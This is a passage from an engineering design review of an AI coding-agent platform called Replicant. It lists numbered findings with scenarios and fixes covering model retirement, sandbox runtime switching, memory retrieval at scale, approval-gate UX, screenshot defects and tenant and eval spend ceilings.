  - Use AWS SDK `retry_mode=adaptive` in the uploader and controller.
  - Throttling extends `finalizeSeconds` (up to a cap) instead of failing.
  - The controller retries 5xx on HEAD and distinguishes 503 from digest mismatch.
  - For QA, persist stage results as they complete, so that after a node loss the retry skips completed
    deterministic stages whose inputs are unchanged (same image digest, same diff digest).
- **Owner:** WS-02, WS-05, WS-10.

### R2-048 · Low · Smaller failure-mode inconsistencies

- **Continue-As-New during run waits.** ADR-01-004 says "never mid-run-wait"; `history-budget.md` and
  `versioning.md` §9 implement `mid_run_can`. Amend the ADR. (WS-01)
- **Temporal reset.** `replicant-operators` may "reset" (`events-and-signals.md` §1), but reset semantics are
  undefined. Deterministic IDs make a reset return old run results. Forbid reset, and offer an admin "retry
  node" that bumps the ordinal. (WS-01, WS-07)
- **Workflow start timing.** `versioning.md` §3.1 starts the workflow "inside the `POST /v1/jobs`
  transaction"; `07 architecture.md` starts it "after commit". Keep "after commit". (WS-01)

### Failure scenarios checked and found adequate

These hold, given R2-010:

- controller crash mid-finalize: stateless reconcile, write-once manifest, memoized terminal status;
- run-notifier or Temporal down for completion: hint plus poll;
- intake while Temporal is down: committed row, `pending` retrier, 60 s SLO met by the "Queued" comment;
- webhook durability;
- double decisions: per-gate lock plus V3/V4;
- pinned version across Continue-As-New, with upgrade-on-CAN explicitly unused;
- Valkey failover: fail closed after 60 s;
- KMS/codec outage: stalls rather than loses work, once R2-010 is fixed.

---

## 3. Long-term viability (lens 3)

How hard is each change in this design?

| Change | Difficulty | Why |
|---|---|---|
| Breaking LangGraph release | **Low–medium** | Exact pin; the `temporalio-langgraph` plugin is not imported (`temporal-langgraph.md` §3.4); replay gate plus engine conformance tests; interpreter fallback. Caveat: Pregel and interpreter histories differ (`graphs/README.md`), so switching the engine for in-flight jobs needs consented migration (and R2-015 must be fixed first) |
| Temporal LangGraph integration deprecated | **Low** | Not a runtime dependency (ADR-01-001) |
| CLI output format change | **Low** | Normalizer ships in the CLI image; `system/init` version check (exit 10); recorded-fixture contract tests |
| CLI session layout or resume semantics change | **Medium**; see R2-053 | Three conflicting resume rules |
| Model retirement | **High**; see R2-044 | |
| Runtime CVE forcing a switch | **High**; see R2-045 | |
| 10× repos | **Medium**; see R2-046 | Frozen `max_repos`, fixed shard sizing |
| Memory at 100,000 entries | **Medium**; see R2-051, R2-052 | |

### R2-044 · High · Model retirement depends on requester consent, and job lifetime is unbounded

- **Sections:**
  - `06-releases-and-evals/upgrades.md` §model retirement: "Bundles still pinned by running jobs at the
    retirement date cannot run model calls". Jobs get `release.notice(worker_version_retire_scheduled)`, a
    worker-version notice kind.
  - `01-orchestration/versioning.md` §6.4: at the deadline "unmigrated jobs are stopped … (`cancelled`,
    takeover offered)". The consent gate defaults to `decline` after 14 days.
  - `00-contracts/adr/009-job-lifetime-spans-pr-review.md` and `repair-limits.yaml`: "30 days after the
    last PR activity". This resets on activity, so a job can live 60–150+ days.
  - Prompt escrow (`release-bundle.md` RB-3) and image retention (UP-6) assume 37 days.
  - `claude-sonnet-4-5-20250929` "retires on 2026-11-30" (`definitions-contracts.md` changelog), 37 days
    from today. It was removed from the contract example, but it is still the model in
    `03-agents-and-tools/examples/policy-budgets.yaml`, `agent-implementer-claude.yaml`,
    `run-inputs-implementer.json`, `gateway-usage-event.json`, `cli-invocation.md`, `gateway.md`, and
    the local `gateway-stub.yaml`.
- **Scenario.**
  - A model retires with a few hundred jobs in long PR review. Requesters who are away do not consent, so
    their jobs are cancelled en masse on the retirement date.
  - Separately, a job alive on day 50 needs a prompt escrow or image that retention has already removed.
- **Fix.**
  - Add `repair_limits.job_max_age_days` (default 60) as a hard cap from creation. Align escrow and
    retention to it plus 7 days.
  - Add a model-retirement path without requester consent: an operator-approved `model_successor`
    mapping produces a patch-lineage bundle B′ (like `bundle_patched`), recorded on the job and checked
    against the gateway's served-model header.
  - Add a `model_retire_scheduled` notice kind.
  - Re-pin all WS-03 examples and the stub to current IDs now.
- **Owner:** WS-06, WS-01, WS-03, WS-00.

### R2-045 · High · Moving off Kata for an unpatched CVE needs a new bundle; in-flight jobs and QA builds cannot move

- **Sections:**
  - `02-execution/runtime-evaluation.md`: tenants or classes move "by a new `runtime_selection` policy
    version (a new bundle, no deploy)". This is a `policy_behavioral` change class, which needs two signers
    (`promotion.md`).
  - In-flight jobs stay pinned (CC-3).
  - `schemas/examples/policy-runtime-selection.example.yaml`: `qa_build: allowedRuntimes: [kata-clh]` only.
  - `manifests/karpenter-sandbox-pools.yaml`: `sbx-kata` cpu limit 2000 vs `sbx-gvisor` 400 (min 0 nodes).
  - `controller.md`: the runtime comes only from the bundle. No operational override exists.
- **Scenario.** A guest-to-host Kata advisory is published with no fix (the 2026 history in
  `threat-model.md` §4.1 makes this plausible).
  1. Security wants every new run off Kata within hours.
  2. The release pipeline needs a new bundle, two signers, and a ramp.
  3. 300 in-flight jobs keep starting new Kata runs until they migrate with consent.
  4. QA builds have no other runtime.
  5. The gVisor pool can serve about 20% of peak.
- **Fix.**
  - Add an operational `runtime_override {scope, from, to, reason}` (platform or tenant, two-person,
    audited) that the controller applies over the bundle's choice for *new* AgentRuns. Record it on the run
    and in the manifest. This is operational config under ADR-013.
  - Size `sbx-gvisor` limits for production peak, or document a degraded-concurrency mode.
  - Define the `qa_build` fallback: gVisor without image builds, or "QA disabled → publish gate shows QA
    inconclusive".
  - Rehearse the switch in the WS-11 kind profile.
- **Owner:** WS-02, WS-09, WS-06.

### R2-046 · Medium · Growing to 15,000 repos hits frozen limits and fixed sizing

- **Sections:**
  - `00-contracts/job-request.schema.json`: `max_repos` `"maximum": 1500`, in a frozen contract.
  - `maintenance-fanout.md`: "Above 4,000 repositories, shard into sub-batches". The sharding is not
    designed.
  - `02-execution/fast-path.md`: repo-mirror is 3 shards × 2 TiB sized for 1,500 repos.
  - `ecosystem-context.md`: Zoekt runs 2 full-index replicas on 500 GiB.
  - `release-bundle.schema.json`: `ref_list` maxItems 500, which caps per-repo environments.
  - `capacity-and-cost.md` scales jobs only, not repos.
- **Fix.**
  - File a CCR to lift `max_repos`, and design nested `MaintenanceShard` children of ≤ 1,000 repos.
  - Make the shard counts configurable, with capacity alerts on `repo_mirror.repos_per_shard` and Zoekt
    index size.
  - Shard Zoekt by repo hash.
  - Add a repo-scale row to `capacity-and-cost.md`.
- **Owner:** WS-00, WS-01, WS-02, WS-04, WS-10.

### R2-051 · Medium · Memory retrieval at 100k+ entries: one global HNSW index, dead versions kept, recall unmeasured, snapshots grow forever

- **Sections:**
  - `04-memory-and-context/sql/memory.sql`: one partial HNSW index per embedding space across all tenants,
    versions, types, and states.
  - `data-model.md`: embeddings are deleted only "on purge / space retirement".
  - `retrieval-injection.md`: episodes grow by about 110k per year. Queries use `iterative_scan =
    relaxed_order`, `max_scan_tuples = 20000`, and then RLS plus app-side repo filters.
  - No recall metric exists for the pull path.
  - Snapshots: `item_count BETWEEN 0 AND 2000` (SQL) vs "≤ 400 items" (`data-model.md`). There is no
    retention, and `ON DELETE RESTRICT` from snapshot items pins old versions. That is about 330k
    snapshots and tens of millions of item rows in 3 years.
- **Scenario.** By year two, a tenant's filtered candidate set is a small fraction of the global graph.
  Iterative scan hits `max_scan_tuples` before finding k matching rows, and `similar_past_work` silently
  returns 3 weak results instead of 10. Nothing alerts.
- **Fix.**
  - Delete embeddings when versions are superseded, rejected, or expired.
  - Partition `entry_embeddings` by tenant, or switch to exact search below a filtered row estimate of
    about 20k.
  - Run a nightly recall probe (HNSW vs exact on sampled queries) with an alert.
  - Retain snapshots for job terminal + 37 days unless referenced by eval or audit, and partition
    `snapshot_items`.
  - Reconcile 400 vs 2000.
- **Owner:** WS-04, WS-10.

### R2-052 · Medium · Admin-only curation (D-25) has no throughput sizing; candidates expire unreviewed

- **Sections:**
  - `governance-default.json`: `max_candidates_per_job: 10`, `candidate_ttl_days: 30`.
  - Agent proposals are never auto-activated, and anything above repo/path needs admins (two for
    tenant/org).
  - `curation-ui.md` performance target is "10k candidates"; the risk "Admin workload at 1,500 repos" has no
    numbers.
- **Scenario.** At 300 jobs/day the system can generate thousands of candidates per day. Most of them
  expire silently, so cross-repo learning plateaus. Nothing tells anyone the queue is dying.
- **Fix.**
  - Add a sizing model (candidates/day by source vs admin-minutes per decision) and queue-age SLOs.
  - Add `replicant_memory_candidates_expired_unreviewed_total` with an alert.
  - Cluster near-duplicate candidates for one decision.
  - Lower per-role candidate caps (agent proposals ≤ 2 per job).
- **Owner:** WS-04, WS-07.

### R2-053 · Medium · Session-resume rules disagree across workstreams and rest on undocumented CLI internals

- **Sections:**
  - `04-memory-and-context/adr/001-cli-session-continuity-per-role.md`: resume only with an *identical* CLI
    image digest, ≤ 256 MiB, < 24 h.
  - `03-agents-and-tools/cli-invocation.md`: "major.minor … equals" with up to 37 days, and elsewhere
    "≤ 7 days … major.minor".
  - `06-releases-and-evals/upgrades.md` relies on cross-version resume for migrated jobs.
  - WS-04 `retrieval-injection.md` sets `CLAUDE_CONFIG_DIR=/replicant/home/.claude`, a token-file
    `headersHelper`, and `--system-prompt-snapshot off`. WS-03 uses `/home/agent/.claude`, keeps tokens
    in agentd only, and omits the flag, which is also absent from WS-03's verified flag list. The contract
    test therefore never checks it.
- **Fix.** Make one rule: exact image digest, enforced by `prepare`. Move all invocation details into WS-03
  and delete the token-file helper (it contradicts ADR-03-001). Add the flag to the contract test, or drop
  it. Make migrated jobs use handoff summaries, never cross-version resume.
- **Owner:** WS-03, WS-04, WS-06.

### R2-054 · Low · Switching graph engine for live jobs is a migration, not a flag

- **Section:** `01-orchestration/graphs/README.md` (Pregel vs interpreter histories differ).
- **Fix.** Document that the fallback applies to new jobs and to consented migrations only. Include it in
  the runbook with the R2-015 fix as a prerequisite.
- **Owner:** WS-01.

---

## 4. User experience (lens 4)

### 4.1 Personas on a bad day

#### R2-017 · High · A merged wrong fix is recorded as success, memory learns from it, and there is no "this was wrong" path

- **Sections:**
  - `01-orchestration/graphs/pr-repair.md` exit: `PR merged | pr_merged | succeeded`.
  - `04-memory-and-context/write-path.md` (auto-activation after merge plus a 24 h quiet period).
  - `taxonomy.md` §1.5 (episodes) and the playbook miner over "merged jobs".
  - `06-releases-and-evals/online-metrics.md` §2 (success = `succeeded`, PR merge rate).
  - `ui/job-detail.md`: "none [actions] on terminal jobs".
- **Scenario.** Maya's fix merges. Two days later the FX rounding is still wrong in production and a human
  reverts the PR. The job page offers nothing. The extracted rule auto-activates, because the quiet
  period hears no signal once the workflow has ended. The episode is a "successful" precedent, it counts
  toward a playbook, and the release metrics score it as a win. Replicant is trained toward plausible
  wrong fixes.
- **Fix.**
  - Add `POST /v1/jobs/{id}/outcome-reports {kind: wrong_fix|regression|reverted, evidence_url}`, shown as
    "Report a problem with this result" on terminal jobs, and `/replicant wrong` on the PR.
  - github-integration detects revert PRs (a `This reverts commit` body matching a `Replicant-Job:` trailer)
    for 30 days.
  - Either signal does four things: sets episode `outcome=reverted`, suspends the job's candidates and
    probation entries, excludes the episode from mining, and increments
    `replicant_job_post_merge_reverted_total`. WS-06 adds "revert rate within 14 d" as a guardrail metric.
- **Owner:** WS-04, WS-06, WS-07, WS-01.

#### R2-018 · High · A reviewer whose comment was misread cannot see or correct what was learned

- **Sections:**
  - `04-memory-and-context/pr-replies.md` §2: the footer shows only an ID, says "(pending review)", and has
    "no link to the admin UI". When the entry auto-activates after merge, "no further PR comment is
    posted". On opt-out, an active entry "goes to the admin review queue" and is not disabled.
  - `07-control-plane-and-ux/ui/memory.md`: non-admins get a 403.
- **Scenario.** Priya wrote "don't use float here, this path is special". The extractor generalized that to
  a repo rule. She cannot read the statement, and "pending review" implies an admin will check it. In fact
  it auto-activates 24 h after merge into about 80% of the repo's jobs (20% holdout) for 14 days, and she
  is never told. `/replicant no-memory` leaves an active entry active until an admin gets to it.
- **Fix.**
  - The footer renders the statement as agents will see it, with the true next state ("activates after
    merge + 24 h unless you object").
  - Add `GET /v1/memory/entries/{id}/public` for the source author and repo readers.
  - Add `/replicant memory-wrong <reason>` (author or CODEOWNER). It immediately suspends candidate or
    probation entries and queues them for admins. This does not change memory state in the D-25 sense:
    `suspended` is a system transition under admin-configured policy, the same as the existing
    contradiction rule D4.
  - Reply in-thread when the entry activates.
- **Owner:** WS-04, WS-07.

#### R2-019 · High · An approver's "Request changes" comment never reaches the agent

- **Sections:**
  - `01-orchestration/gates.md` Open questions: staging `gates[*].decision.comment` "is a
    `context.stage_inputs` change (WS-04, XD-01-07)". XD-01-07 in `cross-ws-dependencies.md` is about eval
    gate scripts, a dangling reference.
  - The comment is *required* for Request changes (`ui/approval-inbox.md`, `components.md` §8).
  - `graphs/bugfix.md`: `publish_gate -->|request_changes| implement`.
- **Scenario.** Priya writes "cache invalidation must also cover the batch path" and clicks Request
  changes. The implementer re-runs with no knowledge of her comment, makes an unrelated tweak, and
  re-opens the gate. She has to repeat herself in steering, if she knows steering exists.
- **Fix.**
  - Make it normative: `context.stage_inputs` includes the latest decision comment as a labelled
    `<untrusted_input source="approver_feedback">` block for the next producing node (plan or implement).
  - Packet revision n+1 shows an "Addressed feedback from r(n)" section.
  - Fix the XD reference and assign WS-04.
- **Owner:** WS-01, WS-04, WS-07.

#### R2-020 · High · A stuck job shows a status the workflow cannot produce, an ETA with no source, and nothing to do

- **Sections:**
  - `01-orchestration/graphs/README.md`: `RUNNER_START` retry "unlimited" for 6 h. That is an activity
    retry policy, invisible to workflow code.
  - `01-orchestration/adr/006-tenant-fairness…` claims the workflow "shows `waiting_capacity`".
  - `ui/job-detail.md`: "Waiting for sandbox capacity (tenant quota 12/12 runs) · ETA ~4 min". I found no
    ETA source.
  - `03-agents-and-tools/gateway.md`: tenant quota exhausted → `waiting_human` with no gate.
  - `notifications.md` §2: no capacity or stall event to the requester.
  - `08-observability/dashboards.md` §3: Temporal backlog *inhibits* the stalled-workflow alert.
- **Scenario.** Maya's job shows "implementing" for three hours. Then the 6 h schedule-to-close fails the
  node. Or the tenant's monthly LLM budget is exhausted, and her job appears in the orange "Needs a human"
  list with no gate, no approver, no expiry, and no notification.
- **Fix.**
  - `runner.start_run` heartbeats `{reason, quota_used, quota_limit, queue_position}`, and the projector
    maps heartbeat details to `sub_status`.
  - Remove "ETA" unless it is computed (p50 of the tenant's running jobs' remaining time).
  - Add the states "Waiting: cluster capacity (attempt n)" and "Paused: tenant model budget exhausted,
    resets Nov 1 · contact payments-leads", and exclude the latter from `needs_human`.
  - Add notifications `job.waiting_capacity` (after 30 min) and `job.tenant_quota_wait`.
  - Show a per-job "no progress in 30 min" banner from the stall reconciler.
- **Owner:** WS-01, WS-02, WS-07, WS-08.

#### R2-021 · High · Rollback leaves gates on the bad bundle approvable, and the dialog defaults to "keep pinned"

- **Sections:**
  - `07-control-plane-and-ux/architecture.md` §9: `migrate_running` defaults to `none`.
  - `06-releases-and-evals/promotion.md` §7.2: notices only "if `migrate_running ≠ none`".
  - `ui/approval-inbox.md` and `components.md` §8: packet banners are fixed to "escalation, base moved,
    stale view", with no bundle state.
  - `versioning.md` §6.1 claims the approval card shows a banner.
  - Screenshot `releases-rollback-dialog-1440-light.png`: "Keep them pinned · Default" while the canary
    shows 9.7% failures.
  - `bundle_migration` eligible is "requester only" (`gates.md` §1).
  - `promotion.md` §7.3 says an undecided `required` migration *expires*; `versioning.md` §6.1 says it ends
    `cancelled … bundle_revoked_not_migrated`.
- **Scenario.**
  1. On-call rolls back a canary that is producing bad diffs and accepts the default.
  2. Twelve jobs at publish gates stay in inboxes, unmarked. Priya approves one, and it ships.
  3. For a safety incident the operator chooses `required`. The fix then depends on each requester
     clicking a migration gate within 24 h, and requesters on leave are cancelled.
- **Fix.**
  - Add a packet banner keyed on the job's bundle state, independent of `migrate_running`: "Produced by
    rb_k7wq…, rolled back at 06:52 by Sam Whitfield: AgentResultInvalid spike. Consider Request changes."
  - The dialog has no default when the rollback is triggered by a guardrail. It shows blast radius before
    commit: pinned jobs by status (running, at gate, in PR review), by tenant, and derived bundles affected.
  - Add `migrate_running=required_by_operator` (permission `release:revoke`), which migrates without
    requester consent and re-issues packets.
  - Reconcile cancelled vs expired.
- **Owner:** WS-06, WS-07, WS-01.

#### R2-022 · Medium · The requester is told to approve their own budget extension, but policy forbids it

- **Sections:**
  - `07-control-plane-and-ux/schemas/examples/gate-rules.global.yaml` `budget.any`:
    `requester_may_decide: true`.
  - `03-agents-and-tools/gateway.md`: "`requester_may_decide: false` unless the requested amount ≤
    `requesterSelfApproveMaxUsd` (default 0, control-review G-07)".
  - `notifications.md`: a DM to the requester "(they must act)".
- **Scenario.** Maya gets "Extend to $60?". Her click is denied ("you requested this job"). The real
  deciders, `{tenant}-leads`, get it only via `dm_eligible`. Reminders are deferred at weekends but expiry
  is not, so a Friday-evening budget hit fails the job by Sunday.
- **Fix.**
  - Align the WS-07 example with G-07.
  - The requester DM becomes informational and names the deciders.
  - Expiry for requester-only and budget gates is deferred with quiet hours.
- **Owner:** WS-07, WS-03.

#### R2-023 · Medium · A gate held by "pause at next gate" still expires, and nobody is told

- **Sections:** `01-orchestration/gates.md` §3 step 3 sets `expires_at` at open. Step 4: if paused
  `at_next_gate` the gate is "held: … approvers not notified, no reminders". Expiry is still checked (V10
  and the wait loop). `ui/job-actions.md` warns only that approvers are not notified.
- **Fix.** Suspend the expiry clock while the gate is held (`expires_at += held_duration`, recorded), or
  state the clock in the pause popover. Send `gate.expiring` to the person who paused.
- **Owner:** WS-01, WS-07.

#### R2-024 · Medium · An approver with 40 pending gates has no triage tools, and reminders overflow into a weekday digest

- **Sections:**
  - `07-control-plane-and-ux/api/control-plane-api.openapi.yaml` `listInbox`: only `view` and
    `sort ∈ {expiry, age, risk}`.
  - `approvals.md` §4.6: "one reminder per gate per 4 h per person" (per gate, not per person).
  - `notifications.md` §5: "20 DMs/hour, overflow goes to digest". The digest runs "09:30 and 15:30 …
    weekdays".
  - N-4 says obligations cannot be silenced, but the overflow silences them.
- **Scenario.** Priya returns from two days off to 40 gates across six repos. She cannot filter to one repo
  or to plan gates. Her Slack gets about 40 reminder DMs per cycle. After 20 in an hour, new high-risk
  `gate.requested` and `gate.expiring` DMs go to Monday's digest while expiry keeps running.
- **Fix.**
  - Add `repo`, `gate_kind`, `risk`, `requester` filters and `group_by=repo|job` to `listInbox` and the UI.
  - Send one consolidated reminder per approver per slot ("12 waiting · 3 expire today").
  - Exempt `gate.requested` (risk ≥ high), `gate.expiring`, and `gate.escalated` from overflow. Overflow
    becomes a single summary DM, not the digest.
- **Owner:** WS-07.

#### R2-025 · Medium · Approver routing: suggestions favour people who never decide, delegation is too narrow, and empty eligibility is undefined

- **Sections:**
  - `approvals.md` §2: "least-recent decision" rotation. §8: "delegate must be eligible".
  - OOO detection works only if the tenant provisions it.
  - `approvals.md` §2 resolves CODEOWNERS "to linked principals". If none are linked, the eligible set is
    empty, and that is undefined.
  - `gates.md` §8 (re-route "at the next escalation") disagrees with `identity.md` §3.4 (immediate).
- **Fix.**
  - Rotate only among linked, recently active, non-OOO principals.
  - At gate open, an empty or unreachable eligible set escalates immediately, and the requester is shown
    "No reachable approver; escalated to …".
  - Allow delegation to non-eligible principals with `min_repo_permission`, recorded on the packet.
  - Reconcile the two docs.
- **Owner:** WS-07, WS-01.

#### R2-026 · Medium · Takeover fails exactly when it is needed

- **Sections:**
  - `ui/job-actions.md`: "the workspace archive … is presigned only to the requester", yet the dialog
    promises "[x] Workspace archive" to anyone with `job:control:any`.
  - `ui/job-detail.md`: no actions on terminal jobs, so `failed` jobs cannot be taken over.
  - Retention: 30 d (dialog, state-ownership) vs `takeoverArchiveDays: 14` (`10-data-platform/lifecycle.md`).
- **Scenario.** The requester was deprovisioned, so the job is paused. The tech lead takes over and the
  archive download is refused. A job that just failed QA, the best moment for a human to finish, has no
  Take over button.
- **Fix.**
  - Presign the archive to the taking-over principal (audited).
  - Allow takeover of `failed` and `expired` jobs within artifact retention.
  - Render the retention from tenant policy.
- **Owner:** WS-07, WS-10.

#### R2-027 · Medium · An approver facing "QA inconclusive" cannot ask for a QA re-run

- **Sections:** `05-qa/failure-feedback.md` §5.3: "ask for QA to be re-run … (the mechanism … is open:
  OQ-05-10)". The decisions are approve, reject, or request_changes only. The banner is missing from
  `components.md` §8.
- **Fix.** Add a decision `rerun_qa` for publish gates, producing a new packet revision with no code
  change, and add the "QA inconclusive" banner.
- **Owner:** WS-05, WS-07, WS-01.

#### R2-028 · Medium · Tenant admins and job viewers cannot flag a harmful memory entry

- **Sections:** `04-memory-and-context/curation-ui.md` §1: "Tenant admins … have no access". Agents can
  flag entries (`appears_wrong`, write-path.md); humans outside PR review cannot.
- **Fix.** Add "Flag this entry" on the read-only Memory-used panel
  (`POST /v1/jobs/{id}/memory/{mem}/flags`). Two independent human flags during probation suspend the
  entry, by system policy, so D-25 is intact. Flags go to the admin queue with an SLA.
- **Owner:** WS-04, WS-07.

#### R2-049 · Low · An unlinked Slack approver loses their click

- **Section:** `identity.md` §4.3: an ephemeral "Link your Slack account" message, and the click is
  dropped.
- **Fix.** After linking, DM "Your Approve on gate … (r3) was not recorded: [Review r3] [Approve r3]"
  using the stored tuple. Never auto-apply it.
- **Owner:** WS-07.

#### R2-050 · Low · Copy inconsistencies users will notice

- **Repair budget.** It is shown as "0 of 3" (job detail, screenshot) and "cycle 1 of 3" (notifications,
  pr-replies), but the policy default is 5 (`pr-repair.md`). Render it from `repair_limits`.
- **Escalation level 2.** The target differs between `approvals.md` §6 and `notifications.md` N-4.
- **Expired-job restart.** The expiry copy "Comment `/replicant run` to start again" discards the approved
  plan. Offer "re-open the expired gate" instead.
- **Owner:** WS-07.

### 4.2 Prototype review (screenshots in `07-control-plane-and-ux/design/screenshots/`)

**Verdict.** This is not generic AI-UI. The IBM Plex pairing, warm neutrals, hairline tables, mono IDs
with dimmed tails, the command palette, and keyboard hints on every primary action read as a deliberate
tool in the Linear and GitHub lineage. The releases page is the strongest screen: its chart title asks a
question, it has direct labels, ramp markers, and a guardrail callout with the posterior and a deadline.
The memory candidate detail ("Provenance", "Overlaps an active entry", "If approved: would have been
selected for 14 of the last 30 jobs") is excellent operator design.

**Banned-pattern check.** I checked all 32 screenshots and found no gradients, glass, sparkles, stat
tiles, card grids, centred heroes, or decorative motion. One near-miss: the QA screenshot thumbnails in
`approvals-*` are grey wireframe sketches labelled "refund-de…". In a screen whose purpose is "everything
an approver needs", that is vague placeholder data. `critique.md` accepts it; I would not, for a review
artifact.

#### R2-029 · Medium · Overflow and clipping at both target widths, including defects the critique marks as fixed

| Screenshot | Defect |
|---|---|
| `job-list-1440-light/dark` | `UPDATED` column clipped at the right edge ("8", "18", "1 m" cut). `critique.md` Pass 3 says this was fixed ("Title column max width 340 → 300 px"), so it has regressed |
| `job-list-1024-*` | `REPO`, `COST`, and `UPDATED` are gone or clipped. Repo is the main way an operator scans a list |
| `memory-admin-1440-dark` | `SOURCE` column clipped ("PR #1431 · Pr") |
| `releases-1024-light` | `WAITING`, `FAILED 24H`, `EVAL Δ` clipped. FAILED 24H is the incident column. The worker table's "Offer migration" button is cut to "O" |
| `job-detail-1440-*` | run header "… 6 vCPU / 16 GiB · dis…" and worker ID truncated with no tooltip affordance |
| `approvals-1440-light` | "Sort: expiry" wraps into a clipped two-line control; diff lines truncated (security impact in R2-007) |

- **Fix.** Add per-table column priority, so low-priority columns drop *before* high-priority ones. Add a
  visible horizontal-scroll affordance (edge fade plus scrollbar). Add a CI check in
  `tools/screenshots.py` that fails when any element's `scrollWidth > clientWidth` without
  `overflow-x: auto`.
- **Owner:** WS-07.

#### R2-034 · Medium · One accent carries five meanings, so "act here" and "something is wrong" look identical

- **Sections:** `design/tokens.json` and screenshot `tokens-1440-dark`. `accent` #f4993c ("a human is
  needed · primary action · focus") and `attention-solid` #faab3f are about the same hue, and both are
  used for:
  - primary buttons ("Approve and publish", "Roll back…", "Approve to active", "New job");
  - focus rings;
  - the `waiting_human` status;
  - memory `candidate`;
  - bundle `canary · paused`;
  - the escalation banner;
  - the guardrail warning.
- **Scenario.** On the releases page in an incident, the guardrail warning box and the "Roll back…" button
  are the same orange. On the memory page, an orange `candidate` diamond sits next to the orange "Approve
  to active" button. Nothing distinguishes "you should press this" from "this needs attention".
- **Fix.**
  - Keep orange for one meaning only, "a human is needed here".
  - Make the primary button ink (text colour on bg, inverted), with the accent used only on focus.
  - Move `canary · paused` and memory `candidate` to the neutral or info families.
  - Give warning banners a distinct hue (amber-yellow, hue ≈ 85), validated by `build_tokens.py`'s CVD
    check.
- **Owner:** WS-07.

#### R2-035 · Medium · Status semantics in the job list are wrong or ambiguous

- **"Open" includes terminal jobs.** `job-list-1440-*`: the "Open 148" filter shows `Succeeded` ("PR #1429
  merged") and `Expired` ("7 d, auto-cancelled") rows. Either the counts are wrong or "Open" means
  something other than open.
- **No sort indicator** on any column header. The URL query (`sort:updated`) is the only clue.
- **"Showing 12 of 148"** has no pagination or load-more control.
- **Fix.**
  - Define Open = non-terminal, and put terminal rows under "Recent".
  - Add sort carets, and use virtualized infinite scroll with a visible count.
- **Owner:** WS-07.

#### R2-036 · Medium · The states operators will actually live in are missing from the prototype

The prototype renders the happy path of each screen. It has none of these:

- a **failed job** detail (which node, which failure class, retry or takeover affordance);
- a **queued or waiting-capacity** job (R2-020);
- **SSE disconnected / projection lag** ("data as of 10:41:12, reconnecting"). The `ui/README.md` banner
  is specified but not rendered;
- a **packet revised while viewing** (`StaleApprovalView` is specified in `components.md` but not rendered);
- an **empty inbox**, and the **degraded backend** state (Temporal down);
- **Slack and GitHub renderings** of a gate. These are the channels most approvals arrive through, and
  their density rules differ;
- a **mobile or narrow** approve flow (approvers on phones via Slack deep links);
- the **"bundle rolled back" packet banner** (R2-021).

**Fix.** Render each as a screenshot state with the same review loop. Failed-job detail and the stale
packet are the priority. **Owner:** WS-07.

---

## 5. Cost (lens 5)

What is well capped:

- per-run budgets enforced at admission with reservations;
- 402s that are never retried;
- extensions capped at 2, each ≤ 0.5×, with no self-approval per G-07;
- QA fix loops and per-job repair cycles;
- self-improvement cadence;
- memory pull limits;
- Loki per-tenant ingestion limits.

The gaps are the ceilings *above* the job, and spend that never passes the gateway.

### R2-055 · High · Tenant spend quota is optional, and there is no platform ceiling

- **Sections:**
  - `03-agents-and-tools/gateway.md` §6.2 admission Lua: `if limit == nil then return false end -- no limit
    configured at this level`.
  - `07-control-plane-and-ux/schemas/tenant-settings.schema.json`: `monthly_budget_usd` is optional, with
    no default and no daily field.
  - `tenancy.sql` `platform_caps` is unseeded.
  - The shim's `GET /internal/v1/tenants/{t}/gateway-quota` is absent from `control-plane-api.openapi.yaml`.
- **Scenario.** A tenant onboarded without a quota, or one whose admin cleared it, has no monthly ceiling.
  Maintenance sweeps (R2-062), repair jobs (R2-059), and per-job top-ups (R2-060) compound with nothing
  above them. Across 40 tenants there is no platform-wide limit.
- **Fix.**
  - Make `quotas.monthly_budget_usd` required, with a platform default, and add `daily_budget_usd`.
  - Seed `platform_caps` (`tenant_monthly_usd_max`, `platform_monthly_usd_max`) and add the shim counter
    `fgw:platform:<yyyymm>`.
  - An absent limit denies with `tenant_quota_unset`.
  - Specify the quota endpoint in the OpenAPI.
- **Owner:** WS-07, WS-03.

### R2-056 · High · Invalid eval runs can be re-run without limit, a budget stop counts as "invalid", and there is no eval spend ceiling

- **Sections:**
  - `06-releases-and-evals/promotion.md` state diagram: "eval invalid (harness error > 3%, budget stop) →
    re-run allowed".
  - §failure table: "Re-run is allowed without consuming the re-roll cap".
  - `eval-harness.md`: a `maxUsd` stop makes the comparison "`invalid`, never `fail`".
  - `promotion-policy.yaml` T3 `maxUsd: 20000`; the harness estimates "≈ $1.5M per year". The budget is
    open (OQ-06-05).
  - `self-improvement.md` charges T3-size evidence ($6.6k–16k) to a "$500" weekly proposer budget.
  - `capacity-reserve.yaml` defines `replicant-eval` priority 50, while `eval-harness.md` cites "value 1000,
    below production's `replicant-standard` at 10000", a class that does not exist.
- **Scenario.**
  1. A candidate whose real cost is about 1.3× the incumbent hits `maxUsd` every time. Each attempt spends
     up to $20k and ends `invalid`, and it is re-run with no attempt limit.
  2. At a production peak, eval runs are preempted, which pushes harness errors above 3%. The run becomes
     invalid and is re-run again.
- **Fix.**
  - Add `promotionPolicy.spend.{weeklyUsd, monthlyUsd}`, checked before each `EvalSuite` start.
  - Add `maxInvalidRerunsPerBundle: 1`.
  - Make `stopped_budget` a fail-class "cost regression" verdict.
  - Exclude `Preempted` from the harness-error rate, retrying those cases separately with a cap.
  - Reconcile priority class names and values.
  - Give the eval tenant a quota (R2-055).
  - Charge proposal evaluations to their own sized budget.
- **Owner:** WS-06, WS-02.

### R2-057 · High · Embeddings have no route through the production gateway, so no budget and no attribution

- **Sections:**
  - `04-memory-and-context/adr/003-embeddings-and-hybrid-retrieval.md` and `data-model.md` put embeddings
    "through the AI gateway".
  - `03-agents-and-tools/gateway-interface.openapi.yaml` has only messages, responses, and Bedrock paths,
    and its service callers are only `replicant-worker`.
  - `11-local-dev/gateway-stub.md` serves `/embeddings/v1/embeddings` locally, so local and production
    diverge (a D-20 parity break).
  - Re-embedding "all active and candidate versions in batches of 128" has no budget.
- **Scenario.** In production, memory writes either fail (there is no embeddings route) or someone adds a
  direct provider key that is never metered. An embedding-model change re-embeds about 400k versions with
  no spend control.
- **Fix.**
  - Add GW-13 `/embeddings/v1/embeddings` to the interface and the memory-service ServiceAccount as a
    caller.
  - Tag usage `purpose=embedding`.
  - Add `budgets.memoryEmbeddingUsdPerTenantDay` and a `reembedBackfillUsdMax` enforced by the backfill
    job.
- **Owner:** WS-03, WS-04.

### R2-058 · Medium · Gateway accounting fails open on unparsed usage, and break-glass removes all budgets

- **Sections:**
